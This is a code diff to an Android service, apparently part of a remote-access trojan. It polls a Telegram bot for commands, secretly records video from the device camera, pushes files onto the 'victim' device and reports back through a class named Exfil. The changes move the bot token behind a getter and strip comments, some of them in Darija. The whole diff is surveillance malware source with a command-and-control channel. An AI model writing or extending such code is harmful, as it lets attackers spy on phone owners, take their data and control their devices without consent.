@@ -161,7 +161,8 @@ public class TelegramService extends Service {
         while (isRunning) {
             HttpURLConnection conn = null;
             try {
-                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
+                // HNA BEDELNA L'TOKEN
+                String urlStr = "https://api.telegram.org/bot" + Exfil.getBotToken() + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                 URL url = new URL(urlStr);
                 conn = (HttpURLConnection) url.openConnection();
                 conn.setConnectTimeout(15000);
@@ -299,11 +300,8 @@ public class TelegramService extends Service {
         Exfil.send(menu);
     }
 
-    // ================== FIXED VIDEO RECORDING ==================
     private void recordVideo(int facing) {
         Exfil.send("🎥 Recording 10s Video...");
-        
-        // Khasna nkhdmo b HandlerThread bach Camera2 API tkhdem
         HandlerThread thread = new HandlerThread("CameraVideoThread");
         thread.start();
         Handler backgroundHandler = new Handler(thread.getLooper());
@@ -365,8 +363,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== HELPER METHODS ==================
-
     private String getCameraId(int facing) {
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
@@ -423,13 +419,15 @@ public class TelegramService extends Service {
     private void downloadFileToVictim(String fileId, String fileName) {
         Exfil.send("⏳ Uploading: " + fileName);
         try {
-            String getFileUrl = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getFile?file_id=" + fileId;
+            // HNA BEDELNA L'TOKEN
+            String getFileUrl = "https://api.telegram.org/bot" + Exfil.getBotToken() + "/getFile?file_id=" + fileId;
             InputStream is = new URL(getFileUrl).openStream();
             java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
             JSONObject json = new JSONObject(s.hasNext() ? s.next() : "");
             String filePath = json.getJSONObject("result").getString("file_path");
 
-            String downloadUrl = "https://api.telegram.org/file/bot" + Exfil.BOT_TOKEN + "/" + filePath;
+            // HNA BEDELNA L'TOKEN
+            String downloadUrl = "https://api.telegram.org/file/bot" + Exfil.getBotToken() + "/" + filePath;
             HttpURLConnection conn = (HttpURLConnection) new URL(downloadUrl).openConnection();
             conn.connect();
 
@@ -480,8 +478,6 @@ public class TelegramService extends Service {
             Exfil.send("❌ App not found.");
         } catch (Exception e) {}
     }
-
-    // ================== OLD FEATURES ==================
 
     private void playAudio(String pathOrUrl) {
         try {
